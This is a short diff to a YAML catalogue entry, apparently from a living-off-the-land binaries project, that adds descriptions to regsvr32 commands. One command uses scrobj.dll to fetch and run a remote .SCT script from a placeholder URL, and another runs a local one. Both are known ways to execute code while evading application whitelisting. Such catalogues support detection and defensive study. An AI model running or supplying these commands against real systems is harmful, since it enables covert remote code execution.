@@ -6,9 +6,9 @@ Created: '2018-05-25'
 Categories: []
 Commands:
   - Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
-    Description: ''
+    Description: Execute the specified remote .SCT script with scrobj.dll.
   - Commands: regsvr32.exe /s /u /i:file.sct scrobj.dll
-    Description: ''
+    Description: Execute the specified local .SCT script with scrobj.dll.
 Full Path:
   - C:\Windows\System32\regsvr32.exe
   - C:\Windows\SysWOW64\regsvr32.exe
